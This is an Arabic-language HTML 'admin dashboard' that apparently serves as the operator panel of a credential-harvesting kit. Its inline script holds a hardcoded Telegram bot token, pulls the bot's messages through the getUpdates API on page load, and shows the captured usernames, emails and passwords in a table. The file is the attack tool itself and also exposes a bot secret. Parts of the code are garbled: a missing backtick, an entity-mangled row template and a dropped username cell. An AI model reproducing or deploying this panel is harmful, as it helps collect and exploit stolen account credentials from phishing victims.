<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>لوحة التحكم - Admin Dashboard</title>
<style>
body { font-family: Tahoma, sans-serif; background: #0f1419; color: #fff; padding: 30px; margin: 0; }
h2 { color: #1d9bf0; margin-bottom: 5px; }
p { color: #71767b; }
.btn { background: #1d9bf0; color: white; border: none; padding: 10px 20px; border-radius: 8px; cursor: pointer; font-weight: bold; margin-bottom: 20px; transition: background 0.2s; }
.btn:hover { background: #1a8cd8; }
table { width: 100%; border-collapse: collapse; background: #242d34; border-radius: 8px; overflow: hidden; box-shadow: 0 4px 10px rgba(0,0,0,0.3); }
th, td { padding: 14px 18px; text-align: right; border-bottom: 1px solid #333639; }
th { background: #1d9bf0; color: #fff; font-weight: bold; }
tr:hover { background: rgba(255,255,255,0.03); }
.badge { background: rgba(29,155,240,0.15); color: #1d9bf0; padding: 4px 8px; border-radius: 4px; font-size: 13px; }
</style>
</head>
<body>

<h2>لوحة التحكم (Admin Dashboard)</h2>
<p>يتم جلب البيانات المسجلة مباشرة من سجل رسائل بوت تيليجرام:</p>

<button class="btn" onclick="loadData()">تحديث البيانات 🔄</button>

<table>
<thead>
<tr>
<th>#</th>
<th>اسم المستخدم / البريد</th>
<th>كلمة المرور</th>
</tr>
</thead>
<tbody id="dataTable">
<tr><td colspan="3" style="text-align: center; color: #71767b; padding: 30px;">جاري تحميل البيانات...</td></tr>
</tbody>
</table>

<script>
// التوكن الخاص بك
const TOKEN = "8973370252:AAGsHeZVDhvxINwVx_-zMtq5xL2HCkmImDU";

async function loadData() {
const tbody = document.getElementById("dataTable");
tbody.innerHTML = '<tr><td colspan="3" style="text-align: center; color: #71767b; padding: 30px;">جاري التحديث...</td></tr>';

try {
const response = await fetch(https://api.telegram.org/bot${TOKEN}/getUpdates`);
const data = await response.json();

if (!data.ok || !data.result || data.result.length === 0) {
tbody.innerHTML = '<tr><td colspan="3" style="text-align: center; color: #71767b; padding: 30px;">لا توجد بيانات مسجلة حتى الآن</td></tr>';
return;
}

let rows = "";
let counter = 1;

data.result.forEach(update => {
if (update.message && update.message.text) {
const text = update.message.text;
// التحقق من أن الرسالة تحتوي على بيانات الدخول
if (text.includes("المستخدم") || text.includes("👤") || text.includes("كلمة المرور")) {
const lines = text.split("\n");
let user = "غير معروف";
let pass = "غير معروف";

lines.forEach(line => {
if (line.includes("المستخدم:") || line.includes("المستخدم")) {
user = line.split(":")[1] ? line.split(":")[1].trim() : user;
}
if (line.includes("كلمة المرور:") || line.includes("كلمة المرور")) {
pass = line.split(":")[1] ? line.split(":")[1].trim() : pass;
}
});

rows += <tr&gt; &lt;td&gt;&lt;span class="badge"&gt;${counter++}</span></td>
<td>{pass}</td>
</tr>`;
}
}
});

if (rows === "") {
tbody.innerHTML = '<tr><td colspan="3" style="text-align: center; color: #71767b; padding: 30px;">لا توجد بيانات مسجلة حتى الآن</td></tr>';
} else {
tbody.innerHTML = rows;
}
} catch (e) {
tbody.innerHTML = '<tr><td colspan="3" style="text-align: center; color: #f4212e; padding: 30px;">فشل الاتصال أو جلب البيانات</td></tr>';
}
}

// تشغيل الدالة تلقائياً عند فتح الصفحة
loadData();
</script>
</body>
</html>
